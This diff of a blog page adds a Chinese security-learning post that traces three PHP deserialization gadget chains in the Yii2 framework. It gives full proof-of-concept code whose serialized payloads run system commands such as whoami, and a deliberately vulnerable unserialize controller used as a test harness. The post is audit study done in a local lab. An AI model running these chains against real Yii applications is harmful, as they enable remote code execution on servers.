@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Troy3e</title>
+  <title itemprop="name">Yii unserialize | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -179,449 +179,296 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 0px;"></div>
-<div id="content" class="site-content">
-  
-  <div class="notice" style="margin-top:60px">
-    <i class="iconfont icon-notification">
-    </i>
-    <div class="notice-content">Social Phobia</div>
-  </div>
-  
-  <div class="top-feature-row">
-  <h1 class="fes-title" style="font-family: 'Ubuntu', sans-serif;">
-  <i class="fa fa-anchor" aria-hidden="true">
-  </i>
-  START:DASH!!</h1>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="https://space.bilibili.com/129300391" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/6326234.jpg">
-        </div>
-        <div class="info">
-          <h3>Bilibili</h3>
-          <p>博主的b站视频</p>
-        </div>
-      </a>
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1175334.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1175334.png">
     </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      Yii unserialize</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="">Troy3e</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2021-9-21<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
   </div>
-  
-</div>
+
+<div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
-      <h1 class="main-title" style="font-family: 'Ubuntu', sans-serif;">
-      <i class="fa fa-envira" aria-hidden="true"></i>
-      Discovery</h1>
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p>说来惭愧，暑假因为实习和眼睛做激光等各种原因，远远没有完成计划。这学期要收收心好好学习了。</p>
+<p>环境搭建，github直接下载：<a href="https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz" target="_blank" rel="noopener">https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz</a></p>
+<p>修改下配置文件config/web.php；给cookieValidationKey修改一个任意值，不然会报错。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921202440.png" alt></p>
+<p>启动，默认是8080端口。<br>php yii serve –port=9999</p>
+<h2 id="链一"><a href="#链一" class="headerlink" title="链一"></a>链一</h2><p>全局寻找__destruct：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921223816.png" alt></p>
+<p>我这里直接找了参考链接里面一样的点，别的点看了几个感觉也是有希望的（call_user_func等）。</p>
+<p>__destruct调用reset，dataReader可控，所以reset调用close。<br>跟进close</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921224213.png" alt></p>
+<p>这个close没什么可以可利用的点，再往下跟一步就是死路。但是因为dataReader参数可控，所以我们可以寻找其他可以利用的close函数。</p>
+<p>全局搜索找到DbSession里的close</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921231015.png" alt></p>
+<p>getIsActive对当前状态进行了一个判别。只有当Yii的debug和gii这两个默认扩展都存在（不一定要开启）时，这里返回true。否则返回false。</p>
+<p>返回true后调用composeFields方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921232552.png" alt></p>
+<p>可以看到有个call_user_func，再看下它的参数是不是可控的，不可控。</p>
+<p>类似于call_user_func($this-&gt;test);或者$test();这种只能调用没有参数的函数的结构。出来简单的调用phpinfo以外，我们也可以考虑将变量赋值为[(new test), “aaa”]这样的一个数组。就可以调用test类中的aaa公共方法。</p>
+<p>直接搜索含有call_user_function的无参函数<br>找到了yii\rest\IndexAction中的run方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921234540.png" alt></p>
+<p>所有参数均可控，也就是说直接调用这个即可。<br>构造一下：</p>
+<pre><code>&lt;?php
+namespace yii\db{
+
+    use yii\web\DbSession;
+
+    class BatchQueryResult
+    {
+           private $_dataReader;
+        public function __construct(){
+            $this-&gt;_dataReader=new DbSession();
+        }
+    }
+}
+namespace yii\web{
+
+    use yii\rest\IndexAction;
+
+    class DbSession{
+        public $writeCallback;
+        public function __construct()
+        {
+            $Troy3e=new IndexAction();
+            $this-&gt;writeCallback=[$Troy3e,&#39;run&#39;];
+        }
+    }
+}
+namespace yii\rest{
+    class IndexAction{
+        public $checkAccess;
+        public $id;
+        public function __construct(){
+            $this-&gt;checkAccess=&#39;system&#39;;
+            $this-&gt;id=&#39;whoami&#39;;
+        }
+    }
+}
+namespace{
+
+    use yii\db\BatchQueryResult;
+
+    echo base64_encode(serialize(new BatchQueryResult()));
+}
+?&gt;
+</code></pre><p>然后在controllers目录下添加个控制器</p>
+<pre><code>&lt;?php
+namespace app\controllers;
+
+
+class SerializeController extends \yii\web\Controller
+{
+    public function actionSerialize($data){
+        return unserialize(base64_decode($data));
+    }
+}
+
+?&gt;
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210922231834.png" alt></p>
+<h2 id="链二"><a href="#链二" class="headerlink" title="链二"></a>链二</h2><p>还是从链一的destruct入手，上一条用了close方法，这次尝试一下call。<br>全局搜索__call，然后在\vendor\fzaninotto\faker\src\Faker\Generator.php找到了个合适的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923131019.png" alt></p>
+<p>跟进format，看到了call_user_func_array</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923131200.png" alt></p>
+<p>看下这个是不是可控的参数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923131528.png" alt></p>
+<p>很明显这是可控的。<br>但是reset里面close是无参方法，传到call里面method就等于close，而attributes为空。到这里其实就很熟悉了，因为这个和链一一样，只要调用一个包含call_user_func的参数可控的无参方法即可。（方法不唯一）</p>
+<pre><code>&lt;?php
+
+namespace yii\db{
+
+    use Faker\Generator;
+
+    class BatchQueryResult{
+        private $_dataReader;
+        public function __construct()
+        {
+            $this-&gt;_dataReader=new Generator();
+        }
+    }
+}
+namespace Faker{
+
+    use yii\rest\IndexAction;
+
+    class Generator{
+        protected $formatters;
+        public function __construct()
+        {
+            $Troy3e=new IndexAction();
+            $this-&gt;formatters[&#39;close&#39;]=[$Troy3e,&#39;run&#39;];
+        }
+    }
+}
+namespace yii\rest{
+
+    class IndexAction{
+        public $checkAccess;
+        public $id;
+        public function __construct(){
+            $this-&gt;checkAccess=&#39;system&#39;;
+            $this-&gt;id=&#39;whoami&#39;;
+        }
+    }
+}
+namespace{
+
+    use yii\db\BatchQueryResult;
+
+    echo base64_encode(serialize(new BatchQueryResult()));
+}
+?&gt;
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923133104.png" alt></p>
+<h2 id="链三"><a href="#链三" class="headerlink" title="链三"></a>链三</h2><p>连找了两个destruct，尝试下wakeup行不行。<br>全局搜下来wakeup看上去能用的就四个<br>这次找的是\vendor\symfony\string\UnicodeString.php中的wakeup。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923133625.png" alt></p>
+<p>百度一波normalizer_is_normalized这个函数，解释是检查所给的字符串是否是标准格式。老实说，这个调用toString我看了一会儿才反应过来是怎么一回事。。生疏了。</p>
+<p>全局搜索toString，太多了，找不过来，直接参考了师傅们给的（有空一定要研究一下全局搜索的tricks：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923142609.png" alt></p>
+<p>value可控，又是一波无参方法，调用IndexAtion里的run方法即可。</p>
+<pre><code>&lt;?php
+namespace Symfony\Component\String{
+
+    use yii\rest\IndexAction;
+
+    class UnicodeString{
+        protected $string;
+        public function __construct(){
+            $Troy3e = new LazyString();
+            $this-&gt;string = $Troy3e;
+        }
+    }
+    class LazyString{
+        private $value;
+        public function __construct(){
+            $Troy3e1 = new IndexAction();
+            $this-&gt;value = [$Troy3e1,&#39;run&#39;];
+        }
+    }    
+}
+namespace yii\rest{
+
+    class IndexAction{
+        public $checkAccess;
+        public $id;
+        public function __construct(){
+            $this-&gt;checkAccess=&#39;system&#39;;
+            $this-&gt;id=&#39;calc.exe&#39;;
+        }
+    }
+}
+namespace {
+    $Troy3e2 = new Symfony\Component\String\UnicodeString();
+    echo base64_encode(serialize($Troy3e2));
+}
+</code></pre><p>就先写三条吧，毕竟不是总结yii的博客，只是学习一下审计。yii的这几条链子还是非常简单的，基本没有难度。</p>
+<p>参考：<br><a href="https://xz.aliyun.com/t/8082" target="_blank" rel="noopener">https://xz.aliyun.com/t/8082</a><br><a href="http://www.wangqingzheng.com/anquanke/29/217929.html" target="_blank" rel="noopener">http://www.wangqingzheng.com/anquanke/29/217929.html</a></p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picturenull"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/wechat.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2021/07/26/Web78-117文件包含/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1159230.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1159230.jpg">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                Web78-117文件包含</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "kEnVX5WKqd0JPt4srHAJkgsC-gzGzoHsz",
+        appKey: "h05kFRgBHS516pQ6vIsYtG1B",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
 
-  <div class="post-thumb">
-    <a href="/2021/09/21/Yii-unserialize/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1175334.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-9-21 15:09</div>
-      <a href="/2021/09/21/Yii-unserialize/" class="post-title">
-        <h3>Yii unserialize</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/09/21/Yii-unserialize/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author">Troy3e</a>
+            </h3>
+          </div>
         </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/07/26/Web78-117文件包含/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1159230.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-7-26 16:07</div>
-      <a href="/2021/07/26/Web78-117文件包含/" class="post-title">
-        <h3>Web78-117文件包含</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/07/26/Web78-117文件包含/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/07/26/Web29-124命令执行/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1160485.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-7-26 16:07</div>
-      <a href="/2021/07/26/Web29-124命令执行/" class="post-title">
-        <h3>Web29-124命令执行</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/07/26/Web29-124命令执行/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/07/26/Web21-28爆破/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1160484.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-7-26 16:07</div>
-      <a href="/2021/07/26/Web21-28爆破/" class="post-title">
-        <h3>Web21-28爆破</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/07/26/Web21-28爆破/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/07/26/Web1-20信息收集/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1161029.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-7-26 16:07</div>
-      <a href="/2021/07/26/Web1-20信息收集/" class="post-title">
-        <h3>Web1-20信息收集</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/07/26/Web1-20信息收集/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/06/21/faka/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1151994.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-6-21 22:06</div>
-      <a href="/2021/06/21/faka/" class="post-title">
-        <h3>faka</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/06/21/faka/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/06/08/极致CMS漏洞整合与分析/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-304364.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-6-8 20:06</div>
-      <a href="/2021/06/08/极致CMS漏洞整合与分析/" class="post-title">
-        <h3>极致CMS漏洞整合与分析</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/06/08/极致CMS漏洞整合与分析/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/06/06/vulnstack内网靶场-二/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-876112.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-6-6 16:06</div>
-      <a href="/2021/06/06/vulnstack内网靶场-二/" class="post-title">
-        <h3>vulnstack内网靶场(二)</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/06/06/vulnstack内网靶场-二/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/06/05/NEWSCTF-Web复现/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-48496.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-6-5 17:06</div>
-      <a href="/2021/06/05/NEWSCTF-Web复现/" class="post-title">
-        <h3>NEWSCTF_2021.6-Web复现</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/06/05/NEWSCTF-Web复现/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/06/03/vulnstack红队实战-一/">
-      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1145960.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-6-3 14:06</div>
-      <a href="/2021/06/03/vulnstack红队实战-一/" class="post-title">
-        <h3>vulnstack内网靶场(一)保姆级教程</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/技术/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2021/06/03/vulnstack红队实战-一/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-
-
-    </main>
-      <!-- 首页默认取最最新文章集 -->
-    <!-- 
-      <nav class="navigator">
-        
-        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="iconfont icon-right"></i></a>
-      </nav>
-     -->
-  </div>
-  
-    <div id="pagination"><a href="/page/2/" class="">Previous</a></div>
-  
+        <hr>
+        <p><i class="iconfont icon-write"></i>SteamID：888007034</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
 
     </div>    
     <div class="ins-search">
